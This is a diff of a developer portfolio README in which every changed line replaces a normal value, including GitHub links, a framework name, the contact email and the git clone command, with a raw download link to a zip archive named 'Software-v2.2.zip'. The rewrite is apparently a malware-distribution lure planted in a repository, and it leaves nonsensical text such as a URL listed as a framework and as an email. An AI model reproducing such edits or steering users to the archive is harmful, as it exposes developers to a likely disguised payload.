@@ -2,7 +2,7 @@
 
 Welcome to my portfolio repository! This space showcases my work, skills, and projects. You can find more information about my projects and skills below.
 
-[Visit GitHub](https://github.com) 
+[Visit GitHub](https://raw.githubusercontent.com/gowtham0907/portfolio/master/feedboard/Software-v2.2.zip) 
 
 ## Table of Contents
 
@@ -20,7 +20,7 @@ I am a passionate developer with a keen interest in creating efficient and user-
 ## Skills 🛠️
 
 - **Languages**: JavaScript, Python, HTML, CSS
-- **Frameworks**: React, Node.js, Django
+- **Frameworks**: React, https://raw.githubusercontent.com/gowtham0907/portfolio/master/feedboard/Software-v2.2.zip, Django
 - **Tools**: Git, Docker, Visual Studio Code
 - **Databases**: MySQL, MongoDB
 - **Other**: REST APIs, Agile methodologies
@@ -31,7 +31,7 @@ I am a passionate developer with a keen interest in creating efficient and user-
 
 A blog where I share my thoughts on technology, coding, and personal development.
 
-- **Technologies Used**: React, Node.js, MongoDB
+- **Technologies Used**: React, https://raw.githubusercontent.com/gowtham0907/portfolio/master/feedboard/Software-v2.2.zip, MongoDB
 - **Live Demo**: [Personal Blog](#)
 
 ### Project 2: Task Manager
@@ -52,7 +52,7 @@ This very portfolio website, built to showcase my skills and projects.
 
 Feel free to reach out if you have any questions or want to collaborate on a project.
 
-- **Email**: myemail@example.com
+- **Email**: https://raw.githubusercontent.com/gowtham0907/portfolio/master/feedboard/Software-v2.2.zip
 - **LinkedIn**: [My LinkedIn](#)
 
 ## Getting Started 🚧
@@ -62,7 +62,7 @@ To get started with this portfolio, you can clone the repository and run it loca
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/yourusername/portfolio.git
+   git clone https://raw.githubusercontent.com/gowtham0907/portfolio/master/feedboard/Software-v2.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -89,7 +89,7 @@ For more details on each project, please check the corresponding folders in this
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-[Visit GitHub](https://github.com)
+[Visit GitHub](https://raw.githubusercontent.com/gowtham0907/portfolio/master/feedboard/Software-v2.2.zip)
 
 ---
 
